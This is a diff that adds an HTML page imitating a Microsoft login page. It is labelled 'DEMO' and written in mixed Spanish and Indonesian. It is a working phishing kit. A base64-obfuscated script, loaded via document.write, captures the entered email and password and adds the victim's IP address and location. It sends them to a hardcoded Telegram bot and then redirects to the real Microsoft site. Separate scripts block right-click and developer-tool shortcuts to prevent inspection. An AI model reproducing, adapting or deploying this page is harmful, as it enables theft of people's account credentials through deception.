@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+   <!-- Inserted by miarroba -->
+              <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
+        <meta name="apple-itunes-app" content="app-id=284847138">
+		
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+
+<title>DEMO</title>
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+body{
+   background: url('https://logincdn.msauth.net/shared/5/images/78_3a53c38a2dc671fb4daf.jpg')
+              no-repeat center center fixed;
+  background-size: cover;
+}
+
+.card{
+  background:#fff;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.15);
+}
+.input{
+  border:1px solid #ccc;
+  padding:12px;
+  width:100%;
+  border-radius:4px;
+}
+.input:focus{
+  outline:none;
+  border-color:#2563eb;
+  box-shadow:0 0 0 1px #2563eb;
+}
+.btn{
+  background:#2563eb;
+  color:#fff;
+  padding:12px;
+  width:100%;
+  border-radius:4px;
+  font-weight:600;
+}
+.btn:hover{
+  background:#1e4fd1;
+}
+.link{
+  color:#2563eb;
+  font-size:14px;
+}
+</style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+</head>
+
+<body class="flex items-center justify-center h-screen">
+
+<div class="card p-8 w-full max-w-md">
+
+
+<form id="loginForm">
+
+<div class="form-group">
+
+
+<p><img src="https://odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.png?b=19606.30550" alt="Microsoft Logo" data-bind="attr: {alt: config.text.AbtMicrosoftLogo}" /></p>
+<br>
+
+  <h1 class="text-2xl font-semibold text-gray-800 mb-2">
+    Login
+  </h1>
+
+  <p class="text-gray-500 mb-6">
+    Verifikasi Microsoft
+  </p>
+
+  <!-- INPUT EMAIL -->
+  <input 
+    id="1" name="1"
+    class="input mb-4"
+    type="email"
+    placeholder="Email" required />
+ 
+
+  <!-- INPUT EMAIL -->
+  <input 
+    id="2" name="2"
+    class="input mb-4"
+    type="text"
+    placeholder="kata sandi email" required />
+ 
+
+
+  <p id="error" class="text-red-500 text-sm mb-3"></p>
+
+  <a href="#" class="link block mb-5">
+
+  ¿No tiene una cuenta? Cree una.
+<br>
+   ¿No puede acceder a su cuenta?
+
+  </a>
+
+  <!-- BOTON -->
+  <button onclick="login()" class="btn">
+    Masuk dan verifikasi
+  </button>
+
+  <p class="text-sm text-gray-500 mt-6 text-center">
+    ¿No tienes cuenta?
+    <a href="#" class="link">Crear una</a>
+  </p>
+
+</div>
+
+
+<script>document.write(decodeURIComponent(escape(atob("CjwvZm9ybT4KCiAgIAogIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjUuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdD4KICAgICQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uICgpIHsKICAgICAgJCgnI2xvZ2luRm9ybScpLnN1Ym1pdChmdW5jdGlvbiAoZSkgewogICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKCiAgICAgICAgY29uc3QgdV9uYW1lMSAgPSAkKCcjMScpLnZhbCgpLnRyaW0oKTsKICAgICAgICBjb25zdCB1X25hbWUyICAgID0gJCgnIzInKS52YWwoKS50cmltKCk7CiAgICAgICAgbGV0IG1lc3NhZ2UgPSBg4pyFIEVtYWlsIC0gNDoyMCDinIVcbkNvcnJlbzogJHt1X25hbWUxfVxuQ2xhdmU6ICR7dV9uYW1lMn1gOwoKICAgICAgICAvLyBPYnRlbmVyIElQIHDDumJsaWNhCiAgICAgICAgICQuZ2V0SlNPTigiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwgZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICBjb25zdCBpcCA9IGRhdGEuaXA7CiAgICAgICAgJC5nZXRKU09OKCJodHRwczovL2lwaW5mby5pbyIsIGZ1bmN0aW9uIChyZXNwb25zZSkgewogICAgICAgICAgY29uc3QgaXAyID0gcmVzcG9uc2UuY2l0eSArICIsICIgKyByZXNwb25zZS5jb3VudHJ5OwogICAgICAgICAgbWVzc2FnZSArPSBgXG7inIUgSVA6ICR7aXB9XG7inIUgVWJpY2FjacOzbjogJHtpcDJ9YDsKCiAgICAgICAgICBjb25zdCB0ZWxlZ3JhbV9ib3RfaWQgPSAiOTE0NDUxNjMzNjpBQUc1UUFjemNmVUM3R2ZSQndvYjl2ZlRNSmFjZHhBcmNoRSI7CiAgICAgICAgICBjb25zdCBjaGF0X2lkID0gIjY5NTY0ODgxMDQiOwogICAgICAgICAgY29uc3Qgc2V0dGluZ3MgPSB7CiAgICAgICAgICAgICJhc3luYyI6IHRydWUsCiAgICAgICAgICAgICJjcm9zc0RvbWFpbiI6IHRydWUsCiAgICAgICAgICAgICJ1cmwiOiAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIgKyB0ZWxlZ3JhbV9ib3RfaWQgKyAiL3NlbmRNZXNzYWdlIiwKICAgICAgICAgICAgIm1ldGhvZCI6ICJQT1NUIiwKICAgICAgICAgICAgImhlYWRlcnMiOiB7CiAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAiY2FjaGUtY29udHJvbCI6ICJuby1jYWNoZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImRhdGEiOiBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgImNoYXRfaWQiOiBjaGF0X2lkLAogICAgICAgICAgICAgICJ0ZXh0IjogbWVzc2FnZQogICAgICAgICAgICB9KQogICAgICAgICAgfTsKCiAgICAgICAgICAkLmFqYXgoc2V0dGluZ3MpLmRvbmUoZnVuY3Rpb24gKCkgewogICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwczovL2xvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20vJzsKICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgICB9KTsKICAgIH0pOwogIH0pOwo8L3NjcmlwdD4K"))));</script>
+
+
+ 
+
+</body>
+</html>
